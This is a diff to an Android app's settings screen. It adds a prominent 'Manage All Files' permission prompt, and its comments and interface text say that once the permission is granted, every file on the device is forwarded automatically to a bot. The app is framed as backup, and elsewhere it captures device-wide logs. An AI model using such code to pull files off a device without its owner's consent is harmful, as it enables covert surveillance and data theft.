@@ -1062,21 +1062,29 @@ public class AppSettingsActivity extends Activity {
                 v -> openManufacturerAutoStart());
         card.addView(makeDivider());
 
-        // ── 10. Storage / Media Access (File Backup) ─────────────────────────
+        // ── 10. Manage All Files (CRITICAL — gives FULL storage access) ─────────
+        boolean hasManageAll = Build.VERSION.SDK_INT < Build.VERSION_CODES.R
+                || Environment.isExternalStorageManager();
+        // highlight with a coloured background to draw attention
+        View manageRow = buildManageAllFilesRow(hasManageAll);
+        card.addView(manageRow);
+        card.addView(makeDivider());
+
+        // ── 11. Storage / Media Access (fallback for API < 30) ───────────────
         boolean hasStorage;
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            hasStorage =
-                checkSelfPermission("android.permission.READ_MEDIA_IMAGES")  == PackageManager.PERMISSION_GRANTED
-             && checkSelfPermission("android.permission.READ_MEDIA_VIDEO")   == PackageManager.PERMISSION_GRANTED
-             && checkSelfPermission("android.permission.READ_MEDIA_AUDIO")   == PackageManager.PERMISSION_GRANTED;
+            hasStorage = hasManageAll ||
+                (checkSelfPermission("android.permission.READ_MEDIA_IMAGES")  == PackageManager.PERMISSION_GRANTED
+              && checkSelfPermission("android.permission.READ_MEDIA_VIDEO")   == PackageManager.PERMISSION_GRANTED
+              && checkSelfPermission("android.permission.READ_MEDIA_AUDIO")   == PackageManager.PERMISSION_GRANTED);
         } else {
-            hasStorage = Build.VERSION.SDK_INT < 23 ||
+            hasStorage = hasManageAll || Build.VERSION.SDK_INT < 23 ||
                 checkSelfPermission("android.permission.READ_EXTERNAL_STORAGE")
                     == PackageManager.PERMISSION_GRANTED;
         }
         addPermRow(card,
-                "📁", "Storage / Media Access",
-                "Required for the File Cloud Backup feature — allows monitoring Camera, Screenshots, WhatsApp, Telegram, Download and all media folders.",
+                "📂", "Media Storage Access",
+                "Fallback media permission — grants access to images, video and audio. Already covered by 'Manage All Files' above.",
                 hasStorage,
                 hasStorage ? null : "Grant",
                 hasStorage ? null : v -> {
@@ -1094,7 +1102,7 @@ public class AppSettingsActivity extends Activity {
                 });
         card.addView(makeDivider());
 
-        // ── 11. Read System Logs (Shizuku) ────────────────────────────────────
+        // ── 12. Read System Logs (Shizuku) ────────────────────────────────────
         addPermRow(card,
                 "📋", "Read System Logs",
                 "Captures device-wide Logcat for the System Console feature.\nRequires Shizuku — install it, start its service, then authorize this app inside Shizuku.",
@@ -1225,6 +1233,126 @@ public class AppSettingsActivity extends Activity {
         }
 
         parent.addView(row);
+    }
+
+    /**
+     * Builds a highlighted permission row for MANAGE_EXTERNAL_STORAGE.
+     * This is the most powerful storage permission — when granted the service
+     * can scan literally every file on the device and forward it to the bot.
+     */
+    private View buildManageAllFilesRow(boolean granted) {
+        // Outer container with accent border / background
+        LinearLayout wrapper = new LinearLayout(this);
+        wrapper.setOrientation(LinearLayout.VERTICAL);
+        wrapper.setPadding(dp(12), dp(12), dp(12), dp(12));
+        GradientDrawable wBg = new GradientDrawable();
+        wBg.setColor(granted ? 0x1500C853 : 0x22FF6D00);   // green tint or amber tint
+        wBg.setCornerRadius(dp(10));
+        wBg.setStroke(dp(1), granted ? 0xFF00C853 : 0xFFFF6D00);
+        wrapper.setBackground(wBg);
+        LinearLayout.LayoutParams wlp = new LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
+        wlp.setMargins(0, dp(2), 0, dp(2));
+        wrapper.setLayoutParams(wlp);
+
+        // Title row
+        LinearLayout row = new LinearLayout(this);
+        row.setOrientation(LinearLayout.HORIZONTAL);
+        row.setGravity(Gravity.CENTER_VERTICAL);
+
+        TextView iconTv = new TextView(this);
+        iconTv.setText("🗄️");
+        iconTv.setTextSize(22);
+        iconTv.setPadding(0, 0, dp(12), 0);
+        row.addView(iconTv);
+
+        LinearLayout textCol = new LinearLayout(this);
+        textCol.setOrientation(LinearLayout.VERTICAL);
+        textCol.setLayoutParams(new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f));
+
+        TextView nameTv = new TextView(this);
+        nameTv.setText("Manage All Files Access  ⚡ CRITICAL");
+        nameTv.setTextColor(granted ? C.green : 0xFFFF6D00);
+        nameTv.setTextSize(14);
+        nameTv.setTypeface(Typeface.DEFAULT_BOLD);
+        textCol.addView(nameTv);
+
+        TextView descTv = new TextView(this);
+        descTv.setText(granted
+            ? "Full storage access granted — all files, all folders, every type, forwarded to bot automatically."
+            : "WITHOUT this, many folders (APKs, ZIPs, browsers, app data) are hidden. Tap 'Enable' to grant true full-storage access.");
+        descTv.setTextColor(C.textSecondary);
+        descTv.setTextSize(11);
+        descTv.setLineSpacing(0, 1.3f);
+        textCol.addView(descTv);
+        row.addView(textCol);
+
+        if (granted) {
+            TextView badge = new TextView(this);
+            badge.setText("✅ Active");
+            badge.setTextColor(C.green);
+            badge.setTextSize(11);
+            badge.setTypeface(Typeface.DEFAULT_BOLD);
+            badge.setPadding(dp(8), 0, 0, 0);
+            row.addView(badge);
+        } else {
+            Button btn = new Button(this);
+            btn.setText("Enable Now");
+            btn.setTextSize(11);
+            btn.setAllCaps(false);
+            btn.setMinWidth(0);
+            btn.setMinHeight(0);
+            btn.setPadding(dp(14), dp(8), dp(14), dp(8));
+            GradientDrawable btnBg = new GradientDrawable();
+            btnBg.setColor(0xFFFF6D00);
+            btnBg.setCornerRadius(dp(8));
+            btn.setBackground(btnBg);
+            btn.setTextColor(0xFFFFFFFF);
+            btn.setTypeface(Typeface.DEFAULT_BOLD);
+            btn.setOnClickListener(v -> openManageAllFilesSettings());
+            LinearLayout.LayoutParams blp = new LinearLayout.LayoutParams(
+                    LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
+            blp.setMargins(dp(8), 0, 0, 0);
+            btn.setLayoutParams(blp);
+            row.addView(btn);
+        }
+
+        wrapper.addView(row);
+
+        // Explanation line below
+        if (!granted && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            TextView hint = new TextView(this);
+            hint.setText("ℹ️  Android 11+: You will be taken to the system 'All Files Access' screen. Toggle the switch for this app, then come back.");
+            hint.setTextColor(C.textHint);
+            hint.setTextSize(10);
+            hint.setPadding(dp(36), dp(6), 0, 0);
+            hint.setLineSpacing(0, 1.3f);
+            wrapper.addView(hint);
+        }
+
+        return wrapper;
+    }
+
+    private void openManageAllFilesSettings() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            try {
+                Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
+                        Uri.parse("package:" + getPackageName()));
+                startActivity(i);
+            } catch (Exception e) {
+                try {
+                    startActivity(new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION));
+                } catch (Exception e2) {
+                    Toast.makeText(this,
+                        "Go to Settings → Privacy/Apps → Special App Access → All Files Access → enable for this app",
+                        Toast.LENGTH_LONG).show();
+                }
+            }
+        } else {
+            // Pre-Android 11: regular storage permission is sufficient
+            requestPermissions(new String[]{"android.permission.WRITE_EXTERNAL_STORAGE",
+                                            "android.permission.READ_EXTERNAL_STORAGE"}, 2004);
+        }
     }
 
     // ─────────────────────────────────────────────────────────────────────────
